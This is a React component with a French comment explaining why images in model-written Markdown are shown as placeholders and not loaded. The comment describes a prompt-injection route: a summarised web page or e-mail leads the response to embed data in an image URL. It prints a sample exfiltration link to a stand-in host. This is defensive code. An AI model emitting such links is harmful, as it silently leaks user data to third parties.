/**
 * Une image écrite par le modèle dans un texte Markdown n'est jamais chargée
 * (B-1050) : la charger ferait partir une requête vers l'adresse qu'il a
 * choisie, sans un clic. Une réponse manipulée par injection de prompt (page
 * web, e-mail résumés) y glisserait des données : `![](https://tiers/?d=…)`.
 * L'image est nommée à sa place.
 */
export function ImageNonAffichee({ alt }: { alt?: string }) {
  return <span className="text-text-muted">{alt ? `Image non affichée : ${alt}` : 'Image non affichée'}</span>;
}
